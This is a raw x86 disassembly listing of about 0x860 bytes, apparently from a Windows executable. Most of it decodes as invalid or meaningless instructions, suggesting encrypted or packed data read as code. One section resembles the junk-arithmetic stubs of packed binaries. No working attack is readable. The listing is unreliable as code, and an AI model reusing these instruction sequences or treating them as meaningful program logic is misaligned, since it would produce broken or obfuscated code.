  403fdc:	lock dec ebp
  403fde:	inc    ebp
  403fdf:	mov    DWORD PTR [ebx-0x39040f73],ecx
  403fe5:	inc    edi
  403fe7:	inc    ebp
  403fe8:	enter  0x918b,0xfc
  403fec:	inc    ebp
  403fed:	(bad)  
  403fee:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3961]
  403ff5:	mov    DWORD PTR [esi-0x4],ebx
  403ff8:	rol    DWORD PTR [ebp-0x37],0x8b
  403ffc:	add    al,0xf4
  403ffe:	push   ebp
  403fff:	into   
  404000:	in     al,dx
  404001:	mov    BYTE PTR [ebp-0x3f],0x8b
  404005:	dec    ebp
  404006:	or     BYTE PTR [ebx],bh
  404008:	xor    BYTE PTR [esi+0x1],0x8b
  40400c:	add    ah,ah
  40400e:	add    dh,al
  404010:	in     al,dx
  404011:	(bad)  
  404012:	push   ebx
  404013:	inc    ebp
  404014:	mov    eax,edi
  404016:	adc    al,ch
  404018:	push   ss
  404019:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40401f:	popa   
  404020:	iret   
  404021:	dec    ebp
  404022:	lahf   
  404023:	mov    esi,DWORD PTR [edx]
  404025:	clc    
  404026:	add    ecx,esi
  404028:	cmp    ecx,edi
  40402a:	jne    0x404014
  40402c:	add    DWORD PTR [ebp-0x6f],0x4f08648b
  404033:	or     BYTE PTR [ebx+0x48ae94d],bl
  404039:	or     eax,DWORD PTR [eax]
  40403b:	push   ebp
  40403c:	dec    ebp
  40403d:	jnp    0xd00a4d0c
  404043:	dec    ebp
  404044:	xlat   BYTE PTR ds:[ebx]
  404045:	mov    ecx,ebx
  404047:	call   0x340a961f
  40404c:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  404053:	(bad)  
  404054:	cld    
  404055:	sti    
  404056:	lahf   
  404057:	(bad)  
  404058:	mov    ebp,0x8b330055
  40405d:	mov    DWORD PTR [eax],ecx
  40405f:	clc    
  404060:	iret   
  404061:	dec    ebp
  404062:	retf   
  404063:	xor    eax,ecx
  404065:	lea    eax,[eax+ecx*1+0x7204]
  40406c:	dec    ebp
  40406d:	inc    ebp
  40406e:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  404074:	mov    esp,DWORD PTR [ecx+0x14]
  404077:	int    0x6
  404079:	sub    eax,DWORD PTR [ebp+0x3]
  40407c:	(bad)  
  40407d:	lock or BYTE PTR [ebp-0x7b],cl
  404081:	mov    edi,eax
  404083:	in     al,dx
  404084:	cmp    ecx,DWORD PTR [ebp-0x64]
  404087:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40408d:	jne    0x404018
  40408f:	mov    ebx,DWORD PTR [eax]
  404091:	in     al,0x45
  404093:	dec    ebp
  404094:	mov    esi,DWORD PTR [ebx]
  404096:	nop
  404097:	add    eax,DWORD PTR [eax]
  404099:	pop    edi
  40409a:	mov    esi,DWORD PTR [ebx]
  40409c:	mov    DWORD PTR [ebx-0x2c],ebx
  40409f:	ret    0x4d
  4040a2:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  4040a8:	mov    ecx,DWORD PTR [ebp+0x3]
  4040ab:	mov    edi,DWORD PTR [eax+edx*4]
  4040ae:	dec    ebp
  4040af:	add    BYTE PTR [ebx-0x387cf775],cl
  4040b5:	jo     0x40407a
  4040b7:	push   esi
  4040b8:	inc    ebp
  4040b9:	jne    0x404046
  4040bb:	mov    ecx,DWORD PTR [eax]
  4040bd:	push   edi
  4040be:	(bad)  
  4040bf:	pop    ecx
  4040c0:	ret    
  4040c1:	push   ecx
  4040c2:	inc    ebp
  4040c3:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  4040c9:	add    BYTE PTR [ebx+0x45d10ccb],al
  4040cf:	jnp    0x406d4d02
  4040d5:	jg     0x404062
  4040d7:	jmp    0x54:0xde85700c
  4040de:	inc    ebp
  4040df:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  4040e3:	push   ebp
  4040e4:	cmp    BYTE PTR [ebx],dh
  4040e6:	dec    ebp
  4040e7:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  4040ed:	cmp    esp,DWORD PTR [ebx]
  4040ef:	jne    0x40407c
  4040f1:	or     DWORD PTR [ecx+edx*4],0xee036440
  4040f8:	jmp    0x40410f
  4040fa:	mov    ebp,ecx
  4040fc:	push   esp
  4040fd:	add    al,0x45
  4040ff:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  404105:	add    eax,ebx
  404107:	cmp    eax,DWORD PTR [ebp+0xf]
  40410a:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  404111:	sbb    BYTE PTR [ebp+0x45],al
  404114:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40411a:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  404120:	mov    DWORD PTR [ebp+0x14],eax
  404123:	cmp    BYTE PTR [ebp-0x64],al
  404126:	cmp    bh,BYTE PTR [edx-0x7387a64]
  40412c:	adc    al,0x55
  40412e:	test   DWORD PTR [ebx+0x454518f8],ecx
  404134:	cmp    al,0x8b
  404136:	pushf  
  404137:	sbb    BYTE PTR [ebx+0x4d01f080],cl
  40413d:	add    BYTE PTR [ebx],dh
  40413f:	add    BYTE PTR [ebx],al
  404141:	dec    ebp
  404142:	jnp    0x898d5a09
  404148:	mov    eax,DWORD PTR [ecx]
  40414a:	rol    BYTE PTR [eax],1
  40414c:	iret   
  40414d:	or     DWORD PTR [eax+ecx*2+0xc32899f],ecx
  404154:	cmp    eax,DWORD PTR [ebp+0xf]
  404157:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40415e:	or     BYTE PTR [ebp-0x39],al
  404161:	xor    eax,ebx
  404163:	add    eax,DWORD PTR [ebp-0x77]
  404166:	mov    edx,DWORD PTR [eax+ebx*1]
  404169:	inc    ebp
  40416a:	inc    ebp
  40416b:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  404171:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  404177:	mov    ebp,eax
  404179:	cmp    cl,dh
  40417b:	dec    ebp
  40417c:	dec    DWORD PTR [eax+0x45]
  40417f:	inc    ecx
  404180:	(bad)  
  404181:	mov    esp,eax
  404183:	or     al,0x85
  404185:	sbb    al,bh
  404187:	inc    eax
  404188:	inc    ebp
  404189:	mov    esi,DWORD PTR [ebx]
  40418b:	or     al,0x3
  40418d:	dec    ecx
  40418e:	push   eax
  40418f:	dec    eax
  404190:	inc    ebp
  404191:	rcl    BYTE PTR [eax-0x38],1
  404194:	push   eax
  404195:	inc    ebp
  404196:	dec    DWORD PTR [ebx-0x3e07c775]
  40419c:	rol    BYTE PTR [ebx],0x4e
  40419f:	inc    eax
  4041a0:	inc    ebp
  4041a1:	mov    DWORD PTR [ebx],esi
  4041a3:	sbb    BYTE PTR [ebx],al
  4041a5:	inc    ebp
  4041a6:	push   eax
  4041a7:	xor    esi,DWORD PTR [ebp+0x3]
  4041aa:	lea    ecx,[ecx+0x45e814b8]
  4041b0:	cmc    
  4041b1:	xor    edi,edi
  4041b3:	add    eax,DWORD PTR [ebp-0x77]
  4041b6:	mov    DWORD PTR [eax+eiz*8],edx
  4041b9:	inc    ebp
  4041ba:	inc    ebp
  4041bb:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  4041c1:	ret    
  4041c2:	inc    ebp
  4041c3:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  4041c9:	adc    al,0x8b
  4041cb:	test   DWORD PTR [eax],edx
  4041cd:	clc    
  4041ce:	inc    ecx
  4041cf:	inc    ebp
  4041d0:	mov    edi,DWORD PTR ds:0xc7c89ce0
  4041d6:	push   ss
  4041d7:	adc    al,0x45
  4041d9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4041df:	mov    eax,DWORD PTR [ebx]
  4041e1:	sbb    BYTE PTR [eax],cl
  4041e3:	(bad)  
  4041e4:	dec    ebp
  4041e5:	ret    
  4041e6:	sub    ebp,DWORD PTR [edi+0x8028be9]
  4041ec:	add    BYTE PTR [ebp+0xc],dl
  4041ef:	xor    esi,DWORD PTR [ebp-0x73]
  4041f2:	lea    edx,[ecx]
  4041f4:	lods   al,BYTE PTR ds:[esi]
  4041f5:	jb     0x4041df
  4041f7:	add    ch,dh
  4041f9:	sar    edi,0x83
  4041fc:	cmp    BYTE PTR [ebx],al
  4041fe:	pushf  
  4041ff:	add    BYTE PTR [ecx+0x4533cc45],cl
  404205:	add    edi,DWORD PTR [ebx]
  404207:	mov    DWORD PTR [esp+edx*1+0x3c445c7],ebx
  40420e:	test   esp,ebx
  404210:	clc    
  404211:	inc    ebp
  404212:	inc    ebp
  404213:	(bad)  
  404214:	cmp    eax,0x8d759cf4
  404219:	mov    ecx,esp
  40421b:	or     al,0x4d
  40421d:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  404223:	clc    
  404224:	lea    eax,[ebp-0x3c]
  404227:	xor    BYTE PTR [ebp-0x64],cl
  40422a:	lea    ecx,[ebx-0x38b21f40]
  404230:	mov    eax,ebx
  404232:	or     BYTE PTR [ebp-0x17344731],cl
  404238:	dec    ebp
  404239:	imul   ecx
  40423b:	inc    DWORD PTR [ecx]
  40423d:	inc    ebp
  40423e:	add    BYTE PTR [ebp-0x74638bc6],al
  404244:	pavgb  mm7,mm6
  404247:	mov    DWORD PTR [eax],0xf0ff8bc3
  40424d:	clc    
  40424e:	iret   
  40424f:	inc    ebp
  404250:	lock push eax
  404252:	retf   
  404253:	fmul   QWORD PTR [ebp-0x1]
  404256:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40425c:	test   BYTE PTR [ebx+0x4d32e09f],cl
  404262:	mov    DWORD PTR [ebx],ebp
  404264:	loopne 0x4041ef
  404266:	inc    ebp
  404267:	loopne 0x4041f4
  404269:	inc    ebp
  40426a:	loopne 0x4041f7
  40426c:	xbegin 0x4088335
  404272:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  404279:	jb     0x4042cb
  40427b:	mov    ecx,DWORD PTR [eax+edi*8]
  40427e:	inc    ebp
  40427f:	inc    eax
  404280:	push   eax
  404281:	mov    ebx,DWORD PTR [edi-0x8]
  404284:	inc    DWORD PTR [ecx-0x75]
  404287:	mov    ebp,esp
  404289:	loopne 0x40428b
  40428b:	rol    edi,0xee
  40428e:	test   BYTE PTR [eax],al
  404290:	dec    ebx
  404291:	push   0x32
  404293:	dec    DWORD PTR [ebx-0x30baf70c]
  404299:	push   eax
  40429a:	mov    dh,0x94
  40429c:	add    edi,edi
  40429e:	cmp    edi,DWORD PTR [eax-0x7877af1]
  4042a4:	add    BYTE PTR [ebp-0x75],al
  4042a7:	(bad)  
  4042a8:	call   0xc7c54375
  4042ad:	clc    
  4042ae:	test   BYTE PTR [ebp+0x4b],al
  4042b1:	cmp    dh,BYTE PTR [edx]
  4042b3:	pushf  
  4042b4:	mov    eax,edi
  4042b6:	or     al,al
  4042b8:	iret   
  4042b9:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4042bf:	mov    DWORD PTR [edi],ecx
  4042c1:	in     al,dx
  4042c2:	pop    eax
  4042c3:	dec    ebp
  4042c4:	add    BYTE PTR [ecx+0x4df8e88b],cl
  4042ca:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  4042d0:	dec    ebx
  4042d1:	mov    DWORD PTR [edx],esi
  4042d3:	in     al,0x8b
  4042d5:	dec    ebp
  4042d6:	or     BYTE PTR [ebx],dh
  4042d8:	iret   
  4042d9:	add    esi,DWORD PTR [esi+0x3be00389]
  4042df:	test   DWORD PTR [edi],0x3d3800
  4042e5:	test   DWORD PTR [ebx+0x84e4f8],ecx
  4042eb:	add    edi,eax
  4042ed:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  4042f4:	mov    eax,DWORD PTR [ebx]
  4042f6:	or     BYTE PTR [ecx+0x45b614cf],cl
  4042fc:	add    esi,DWORD PTR [ebx]
  4042fe:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  404304:	add    BYTE PTR [eax],al
  404306:	mov    eax,DWORD PTR [ebp-0x18]
  404309:	mov    eax,DWORD PTR [eax]
  40430b:	lock (bad) 
  40430d:	dec    ebp
  40430e:	test   BYTE PTR [ebx],dh
  404310:	dec    ebx
  404311:	add    esi,DWORD PTR [edx]
  404313:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  404319:	or     bh,cl
  40431b:	(bad)  
  40431c:	mov    ebx,es
  40431e:	dec    ebx
  40431f:	push   0x32
  404321:	lea    esi,[edx]
  404323:	lods   al,BYTE PTR ds:[esi]
  404324:	mov    ebp,eax
  404326:	clc    
  404327:	cli    
  404328:	or     edi,edi
  40432a:	iret   
  40432b:	inc    ebp
  40432c:	mov    WORD PTR [ebx-0x75cdccb5],cs
  404332:	or     al,BYTE PTR ds:0xec728b
  404338:	or     DWORD PTR [ebp-0x31],ecx
  40433b:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  404342:	cmp    al,cl
  404344:	je     0x40451e
  40434a:	mov    eax,DWORD PTR [ebp-0x8]
  40434d:	mov    eax,DWORD PTR [eax]
  40434f:	xor    eax,edi
  404351:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  404358:	mov    ecx,DWORD PTR [ebp-0x18]
  40435b:	xor    ecx,DWORD PTR [ecx]
  40435d:	bswap  edi
  40435f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  404367:	add    DWORD PTR [ebx+0x945e400],ecx
  40436d:	mov    ecx,edi
  40436f:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  404376:	or     al,BYTE PTR [eax]
  404378:	mov    ecx,DWORD PTR [ebp-0x18]
  40437b:	xor    ecx,DWORD PTR [ecx]
  40437d:	bswap  edi
  40437f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  404387:	add    DWORD PTR [edi],ecx
  404389:	add    BYTE PTR [eax-0x7474ffbb],dl
  40438f:	xor    esp,esp
  404391:	mov    al,BYTE PTR [eax]
  404393:	add    eax,0x8472c7
  404398:	dec    ebx
  404399:	dec    ebp
  40439a:	xor    dh,BYTE PTR [ebx]
  40439c:	mov    ecx,DWORD PTR [edi]
  40439e:	clc    
  40439f:	ror    BYTE PTR [ecx],0xcb
  4043a2:	iret   
  4043a3:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  4043ab:	inc    ebp
  4043ac:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  4043b2:	iret   
  4043b3:	add    eax,0x4b728c
  4043b8:	xor    cl,BYTE PTR [ebp+0xa]
  4043bb:	mov    ecx,DWORD PTR [ebx+0x98af833]
  4043c1:	or     eax,0x8c72cf
  4043c6:	dec    edi
  4043c7:	shl    DWORD PTR [edx],0x4d
  4043ca:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4043d0:	in     al,0xd
  4043d2:	add    BYTE PTR [edx-0x39],dh
  4043d5:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4043dc:	mov    esi,DWORD PTR [ebx]
  4043de:	in     al,dx
  4043df:	mov    cl,BYTE PTR [ecx]
  4043e1:	or     eax,0x8c72cf
  4043e6:	dec    ebx
  4043e7:	enter  0x8532,0x32
  4043eb:	add    BYTE PTR [ebx+0x945e800],cl
  4043f1:	mov    ecx,edi
  4043f3:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  4043fa:	or     al,BYTE PTR [eax]
  4043fc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4043ff:	mov    ecx,DWORD PTR [ecx]
  404401:	xor    ecx,edi
  404403:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  40440a:	cmp    al,cl
  40440c:	jne    0x40445b
  40440e:	lea    ecx,[ebx-0x7517cc54]
  404414:	cli    
  404415:	or     eax,0x4d72ff
  40441a:	cmp    eax,ecx
  40441c:	je     0x40446b
  40441e:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  404424:	ret    
  404425:	or     eax,0x8b7245
  40442a:	lock enter 0x85c7,0x84
  40442f:	add    BYTE PTR [edi+0x33453200],bl
  404435:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40443b:	add    eax,0x37233
  404440:	cmp    ecx,DWORD PTR [ebp+0xf]
  404443:	mov    esi,edi
  404445:	xor    edi,edi
  404447:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40444d:	add    BYTE PTR [ebx],dh
  40444f:	rol    DWORD PTR [ebx],0x4d
  404452:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  404458:	lock or eax,0x33724d
  40445e:	(bad)  
  40445f:	ror    DWORD PTR [eax],0x4d
  404462:	jb     0x4043ef
  404464:	add    BYTE PTR [ebx],dh
  404466:	ja     0x4043f2
  404468:	sbb    BYTE PTR ds:0x8d7275,cl
  40446e:	xchg   esp,eax
  40446f:	enter  0x50e8,0xf3
  404473:	inc    ebp
  404474:	dec    DWORD PTR [ebx-0x7574ccbb]
  40447a:	loopne 0x404481
  40447c:	(bad)  
  40447d:	jb     0x404442
  40447f:	add    cl,al
  404481:	dec    ebp
  404482:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  404488:	add    ecx,DWORD PTR ds:0x187250
  40448e:	inc    ebp
  40448f:	rcl    DWORD PTR [eax+0x4d],0x4f
  404493:	mov    edi,edi
  404495:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40449b:	jb     0x404426
  40449d:	add    BYTE PTR [ecx+eax*8],dl
  4044a0:	jne    0x4044ef
  4044a2:	dec    DWORD PTR [ebx-0x75baccec]
  4044a8:	add    ecx,DWORD PTR ds:0xe872d8
  4044ae:	repnz enter 0x10ff,0x45
  4044b3:	inc    ebp
  4044b4:	mov    edx,DWORD PTR [eax-0x20]
  4044b7:	mov    ds:0x8bc3ffc7,eax
  4044bc:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  4044c4:	mov    esi,DWORD PTR [ebx]
  4044c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c7:	add    eax,DWORD PTR [ebp-0x77]
  4044ca:	push   eax
  4044cb:	adc    al,0x15
  4044cd:	inc    ebp
  4044ce:	push   DWORD PTR [ebx]
  4044d0:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  4044d6:	add    DWORD PTR [eax],eax
  4044d8:	mov    eax,edi
  4044da:	test   al,0x4d
  4044dc:	inc    ebp
  4044dd:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  4044e3:	retf   
  4044e4:	mov    edx,ecx
  4044e6:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  4044ed:	inc    ebp
  4044ee:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  4044f4:	xor    eax,ebx
  4044f6:	(bad)  
  4044f7:	enter  0x1111,0x72
  4044fb:	inc    ebp
  4044fc:	add    BYTE PTR [ebx-0x387de73f],cl
  404502:	cld    
  404503:	test   bh,bh
  404505:	lahf   
  404506:	jne    0x40453a
  404508:	mov    ebp,ebx
  40450a:	fsubr  DWORD PTR [edx+0x6]
  40450d:	dec    DWORD PTR [edx]
  40450f:	hlt    
  404510:	xor    eax,0x7f502d45
  404515:	sbb    ch,ah
  404517:	call   DWORD PTR [edx-0x75]
  40451a:	pop    esi
  40451b:	or     cl,cl
  40451d:	dec    ebp
  40451e:	adc    al,0x33
  404520:	push   ebp
  404521:	add    ebp,esp
  404523:	cmp    esp,esp
  404525:	je     0x4044aa
  404527:	mov    esp,DWORD PTR [eax]
  404529:	or     BYTE PTR [eax],bh
  40452b:	(bad)  
  40452c:	pushf  
  40452d:	ret    
  40452e:	mov    DWORD PTR [edx+0x24],ebp
  404531:	lea    ecx,[ebp+0x44e80394]
  404537:	clc    
  404538:	or     al,0xff
  40453a:	push   esp
  40453b:	inc    ebp
  40453c:	or     BYTE PTR [ebx+0x450818be],al
  404542:	pop    es
  404543:	call   esi
  404545:	test   al,0xbf
  404547:	jne    0x4045bb
  404549:	mov    eax,DWORD PTR [eax]
  40454b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454c:	xlat   BYTE PTR ds:[ebx]
  40454d:	inc    ebp
  40454e:	push   esp
  40454f:	push   eax
  404550:	or     al,0xde
  404552:	push   ebp
  404553:	dec    DWORD PTR [ecx-0x74f7db75]
  404559:	dec    ebp
  40455a:	adc    BYTE PTR [ebx],dh
  40455c:	rol    DWORD PTR [ebx],1
  40455e:	sbb    BYTE PTR [ebx],bh
  404560:	dec    esp
  404561:	je     0x404577
  404563:	push   0x54
  404565:	call   DWORD PTR [eax]
  404567:	test   al,0xce
  404569:	inc    ebp
  40456a:	iret   
  40456b:	add    ebp,DWORD PTR [edi+0x24e889d8]
  404571:	clc    
  404572:	jmp    0x854776
  404577:	mov    edx,eax
  404579:	test   al,0x1f
  40457b:	or     BYTE PTR [ebp+eax*2+0x10],al
  40457f:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  404583:	inc    ebp
  404584:	(bad)  
  404585:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9f]
  40458c:	mov    DWORD PTR [ebx],eax
  40458e:	and    al,0xf
  404590:	push   0xf84d85c1
  404595:	mov    edi,ebp
  404597:	rol    BYTE PTR [eax],1
  404599:	iret   
  40459a:	or     DWORD PTR [edx+edi*1+0x75329c9f],0x850f683b
  4045a5:	push   edi
  4045a6:	clc    
  4045a7:	(bad)  
  4045a8:	jmp    0x404535
  4045aa:	add    BYTE PTR [eax],dl
  4045ac:	mov    eax,0xf8898545
  4045b1:	jmp    0x404583
  4045b3:	add    DWORD PTR [ebp+0x640091],0x206544be
  4045bd:	pop    edi
  4045be:	inc    esp
  4045bf:	pop    ebx
  4045c0:	sbb    dl,al
  4045c2:	inc    ebp
  4045c3:	add    BYTE PTR [ecx-0x747cdb75],cl
  4045c9:	clc    
  4045ca:	and    al,0xec
  4045cc:	mov    DWORD PTR [ecx-0x7747adc],edi
  4045d2:	and    al,0x4c
  4045d4:	mov    DWORD PTR [eax],ecx
  4045d6:	and    al,0x41
  4045d8:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  4045de:	and    al,0x24
  4045e0:	xor    edx,DWORD PTR [esi+0x3]
  4045e3:	pop    ecx
  4045e4:	mov    DWORD PTR [ecx-0x75],edx
  4045e7:	xor    esp,DWORD PTR [edi+edx*2]
  4045ea:	mov    ebx,DWORD PTR [edi+0x3003294]
  4045f0:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  4045f6:	mov    ecx,DWORD PTR [esp+edx*4]
  4045f9:	push   esp
  4045fa:	add    BYTE PTR [eax],ah
  4045fc:	mov    edx,DWORD PTR [ebp+0x3]
  4045ff:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  404606:	mov    DWORD PTR [ebx+0x33002401],ecx
  40460c:	dec    ecx
  40460d:	add    ebp,DWORD PTR [edx+0xf]
  404610:	push   0x4c30ca
  404615:	adc    BYTE PTR [eax+0x1f],dh
  404618:	push   0x0
  40461a:	(bad)  
  40461b:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  404621:	and    al,0x24
  404623:	mov    esi,DWORD PTR [ebx]
  404625:	and    al,0x3
  404627:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40462d:	jb     0x404653
  40462f:	add    bh,bh
  404631:	inc    esp
  404632:	and    al,0x14
  404634:	lea    edi,[edx]
  404636:	and    al,0x9c
  404638:	push   eax
  404639:	jmp    0x544682
  40463e:	(bad)  
  40463f:	cli    
  404640:	and    al,0x85
  404642:	(bad)  
  404643:	clc    
  404644:	and    al,0xa
  404646:	call   0xffdd3f88
  40464b:	jmp    0x544694
  404650:	dec    esp
  404651:	ds or  al,0x9c
  404654:	(bad)  
  404655:	cmp    eax,edi
  404657:	bswap  eax
  404659:	mov    bh,0x4b
  40465b:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40465f:	and    al,0x4c
  404661:	mov    DWORD PTR [esp],ebx
  404664:	(bad)  
  404665:	mov    eax,edi
  404667:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40466d:	inc    esp
  40466e:	jmp    0x404684
  404670:	add    DWORD PTR [ebp+edi*1+0x20],0x1075449c
  404678:	push   0xf8148544
  40467d:	inc    esp
  40467e:	sbb    BYTE PTR [edx+edi*8],dl
  404681:	dec    esp
  404682:	test   DWORD PTR [eax+edi*8],ebx
  404685:	mov    BYTE PTR [edi],0xc7
  404688:	aas    
  404689:	add    DWORD PTR [esp+eax*2-0x7f7ee715],ebx
  404690:	aas    
  404691:	add    DWORD PTR [eax+eax*1+0x44500875],ebx
  404698:	jne    0x4046b2
  40469a:	inc    DWORD PTR [eax+0xfa01f8]
  4046a0:	clc    
  4046a1:	add    bh,bh
  4046a3:	inc    ecx
  4046a4:	jne    0x404631
  4046a6:	call   0xffcc44cf
  4046ab:	fadd   DWORD PTR [eax+eax*1+0xc]
  4046af:	mov    eax,DWORD PTR [esp+edx*1+0xc]
  4046b3:	add    al,0x5e
  4046b5:	add    ch,ah
  4046b7:	add    dl,al
  4046b9:	inc    DWORD PTR [eax]
  4046bb:	push   eax
  4046bc:	and    al,0x0
  4046be:	rol    DWORD PTR ss:[ebp-0x63f3f8bc],1
  4046c5:	inc    esp
  4046c6:	adc    DWORD PTR [esp+ebx*4],0x9c768c6
  4046cd:	inc    esp
  4046ce:	adc    BYTE PTR [eax+ecx*1],ah
  4046d1:	inc    esp
  4046d2:	call   FWORD PTR [esp]
  4046d5:	je     0x4046fb
  4046d7:	sbb    BYTE PTR [ebx-0x74d7f3bc],cl
  4046dd:	lea    ecx,[ebx+0x3b503324]
  4046e3:	je     0x404670
  4046e5:	sub    al,0x8b
  4046e7:	je     0x40471c
  4046e9:	and    al,0xf
  4046eb:	mov    bl,0x1
  4046ed:	(bad)  
  4046ee:	clc    
  4046ef:	and    al,0xeb
  4046f1:	and    al,0x75
  4046f3:	add    eax,DWORD PTR [ebp-0x74db818c]
  4046f9:	and    al,0x5d
  4046fb:	add    eax,DWORD PTR [edx+edi*8+0x3c]
  4046ff:	cmp    al,0x85
  404701:	or     al,0x89
  404703:	pop    edi
  404704:	push   ebp
  404705:	mov    ebp,esp
  404707:	sub    esp,0x78
  40470a:	xor    eax,DWORD PTR ds:0x412370
  404710:	mov    eax,ds:0x40d5d0
  404715:	mov    DWORD PTR [ebp-0x10],eax
  404718:	mov    eax,ds:0x40d6dc
  40471d:	or     DWORD PTR ds:0x417e59,0x49bb
  404727:	mov    DWORD PTR [ebp-0x30],eax
  40472a:	mov    DWORD PTR [ebp-0xc],0xf89c8538
  404731:	mov    eax,ds:0x412368
  404736:	and    DWORD PTR ds:0x41abde,eax
  40473c:	mov    DWORD PTR [ebp-0x14],0xf89c853b
  404743:	mov    eax,DWORD PTR [ebp-0xc]
  404746:	xor    DWORD PTR ds:0x4235cf,0x412378
  404750:	push   ebx
  404751:	push   esi
  404752:	and    DWORD PTR ds:0x417e55,0x7bf9
  40475c:	push   edi
  40475d:	mov    esi,0x7510859
  404762:	xor    eax,esi
  404764:	add    DWORD PTR ds:0x4235d7,0x4e22
  40476e:	mov    edi,0x32729f
  404773:	or     DWORD PTR ds:0x4235d7,0x5629
  40477d:	add    eax,edi
  40477f:	mov    DWORD PTR [ebp-0x20],eax
  404782:	movzx  eax,WORD PTR ds:0x412370
  404789:	and    DWORD PTR ds:0x415111,eax
  40478f:	mov    DWORD PTR [ebp-0x28],0xf89cb538
  404796:	dec    eax
  404797:	mov    DWORD PTR [ebp-0x34],0xf89f0538
  40479e:	mov    DWORD PTR [ebp-0x2c],0xf89c85f8
  4047a5:	add    DWORD PTR ds:0x41abd2,edx
  4047ab:	jmp    0x404924
  4047b0:	xlat   BYTE PTR ds:[ebx]
  4047b1:	mov    dl,0x2
  4047b3:	and    edi,DWORD PTR [ebx-0x5fa5289d]
  4047b9:	mov    al,ds:0x57fd87ea
  4047be:	mov    eax,0x7e7e7e9c
  4047c3:	jle    0x40479f
  4047c5:	jg     0x404845
  4047c7:	jle    0x404797
  4047c9:	(bad)  
  4047ca:	cmp    eax,0xcfdb31c5
  4047cf:	fld    st(2)
  4047d1:	ja     0x404847
  4047d3:	or     eax,DWORD PTR [eax]
  4047d5:	pop    edi
  4047d6:	or     BYTE PTR [edi],cl
  4047d8:	cmp    ecx,DWORD PTR [edi]
  4047da:	enter  0x3710,0x18
  4047de:	pop    ds
  4047df:	mov    cl,0x50
  4047e1:	or     BYTE PTR [edi-0x4210f123],ah
  4047e7:	rol    esi,cl
  4047e9:	or     ecx,DWORD PTR [esi-0x551b41ea]
  4047ef:	dec    ecx
  4047f0:	add    eax,0x1fb6dead
  4047f5:	push   esi
  4047f6:	in     al,dx
  4047f7:	outs   dx,DWORD PTR ds:[esi]
  4047f8:	add    ebx,DWORD PTR [ecx]
  4047fa:	pushf  
  4047fb:	jo     0x4047c3
  4047fd:	dec    eax
  4047fe:	mov    ds:0x34d92d5b,al
  404803:	cmp    al,0xad
  404805:	xor    BYTE PTR [ebx+0x35],0xa3
  404809:	jbe    0x40483f
  40480b:	fisttp DWORD PTR [ecx+0x3198c6f1]
  404811:	jecxz  0x40484b
  404813:	and    ecx,0x4f
  404816:	(bad)  
  404817:	xchg   esi,eax
  404818:	dec    ecx
  404819:	inc    DWORD PTR [edi-0x2d5e8870]
  40481f:	mov    ebp,0x4526ed4d
  404824:	sub    edi,DWORD PTR [edx-0x4361911e]
  40482a:	jae    0x404845
  40482c:	retf   
  40482d:	call   0xd4ca:0x5ee3c429
  404834:	mov    al,0xf8
  404836:	loop   0x4047d2
  404838:	cmp    edi,ecx
  40483a:	fs push ebp
  40483c:	(bad)  
  40483d:	sub    ch,cl
  40483f:	or     dl,cl
  404841:	sbb    DWORD PTR [ecx-0x6a],ebx
